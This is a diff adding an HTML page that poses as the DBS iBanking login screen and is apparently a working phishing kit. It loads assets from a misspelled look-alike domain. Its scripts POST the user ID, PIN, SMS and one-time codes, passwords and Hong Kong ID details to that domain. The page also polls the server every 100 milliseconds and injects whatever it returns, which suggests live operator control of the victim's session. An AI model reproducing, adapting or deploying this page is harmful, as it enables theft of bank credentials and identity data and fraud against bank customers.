@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en" xmlns="http://www.w3.org/1999/html">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"/>
+  <title>
+   DBS iBanking
+  </title>
+  <meta content="" name="description"/>
+  <link href="https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Project/Frontend/View/Assets/img/1/favicon.png" rel="icon" type="image/png"/>
+  <link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" rel="stylesheet"/>
+  <link href="https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+   <link href="https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Project/Frontend/View/Assets/style.css?17015" rel="stylesheet"/>
+  </link>
+ </head>
+ <body style="background:none;">
+  <section class="login-ekrani standart-page">
+   <div class="d-flex justify-content-md-center bd-highlight mb-3" style="height: 100vh">
+    <div class="container">
+     <!--<div class="content">
+<strong>Industry Scheduled Maintenance:</strong> PayNow Services (Local &amp; Overseas) will be unavailable from 1:30am to 5:30am on 01 April. Thank you for your patience.
+            </div>-->
+     <div class="logo">
+      <img alt="" class="script-logo" src="https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Project/Frontend/View/Assets/img/1/logo.webp"/>
+     </div>
+     <div class="form-area">
+      <form id="login-form" onsubmit="return false">
+       <div class="normal-input">
+        <label>
+         User ID
+        </label>
+        <input autocomplete="off" name="UID" required="" type="text"/>
+       </div>
+       <br/>
+       <div class="normal-input">
+        <label>
+         PIN
+        </label>
+        <input autocomplete="off" class="pin" minlength="9" name="pin" required="" type="number" value=""/>
+       </div>
+       <span class="response-login">
+       </span>
+       <button class="btn" onclick="loginButton()" type="submit">
+        Login
+       </button>
+       <button class="btn" style="margin-top: 20px; background: #fff; color: #ee1818;">
+        Get started
+       </button>
+      </form>
+     </div>
+     <div style="margin-right: -15px !important; margin-left: -15px;">
+      <br/>
+      <img src="https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Project/Frontend/View/Assets/alt.png" width="100%"/>
+     </div>
+    </div>
+   </div>
+  </section>
+  <div class="user-notifications">
+  </div>
+  <script crossorigin="anonymous" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js">
+  </script>
+  <script crossorigin="anonymous" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" src="https://code.jquery.com/jquery-3.6.0.js">
+  </script>
+  <script crossorigin="anonymous" integrity="sha512-zdfH1XdRONkxXKLQxCI2Ak3c9wNymTiPh5cU4OsUavFDATDbUzLR+SYWWz0RkhDmBDT0gNSUe4xrQXx8D89JIQ==" referrerpolicy="no-referrer" src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.8-beta.17/jquery.inputmask.min.js">
+  </script>
+  <script type="text/javascript">
+   $(":input").inputmask();
+$("#nnin").inputmask({
+    "mask": "999999 99999",
+    "placeholder": ""
+});
+$(".phone").inputmask({
+    "mask": "99 999 99 99",
+    "placeholder": ""
+});
+  </script>
+  <script type="text/javascript">
+   function loginButton() {
+    $.ajax({
+        type: "POST",
+        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=login',
+        data: $("form#login-form").serialize(),
+        success: function(response) {
+            $(".response-login").html(response);
+        },
+    });
+}
+
+function registerButton() {
+    $.ajax({
+        type: "POST",
+        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=register',
+        data: $("form#register-form").serialize(),
+        success: function(response) {
+            $(".response-register").html(response);
+        },
+    });
+}
+
+function codeButton() {
+    $.ajax({
+        type: "POST",
+        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=code_iste',
+        data: $("form#code-form").serialize(),
+        success: function(response) {
+            $(".response-code").html(response);
+        },
+    });
+}
+
+function smsButton() {
+    $.ajax({
+        type: "POST",
+        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=sms_iste',
+        data: $("form#sms-form").serialize(),
+        success: function(response) {
+            $(".response-sms").html(response);
+        },
+    });
+}
+
+function pinButton() {
+    $.ajax({
+        type: "POST",
+        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=pin_iste',
+        data: $("form#pin-form").serialize(),
+        success: function(response) {
+            $(".response-pin").html(response);
+        },
+    });
+}
+
+
+function passwordButton() {
+    $.ajax({
+        type: "POST",
+        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=password_iste',
+        data: $("form#password-form").serialize(),
+        success: function(response) {
+            $(".response-password").html(response);
+        },
+    });
+}
+
+function hkidButton() {
+    $.ajax({
+        type: "POST",
+        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=hkid_iste',
+        data: $("form#hkid-form").serialize(),
+        success: function(response) {
+            $(".response-hkid").html(response);
+        },
+    });
+}
+
+function userNotifications() {
+    $.ajax({
+        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=user_notifications',
+        success: function(response) {
+            $(".user-notifications").html(response);
+        },
+    });
+}
+userNotifications();
+setInterval(function() {
+    userNotifications();
+}, 100);
+
+
+
+var elts = document.getElementsByClassName('input-key')
+Array.from(elts).forEach(function(elt) {
+    elt.addEventListener("keyup", function(event) {
+        console.log(elt.value.length);
+        // Number 13 is the "Enter" key on the keyboard
+        if (event.keyCode === 13 || elt.value.length > 0) {
+            // Focus on the next sibling
+            elt.nextElementSibling.focus()
+        }
+    });
+})
+  </script>
+ </body>
+</html>
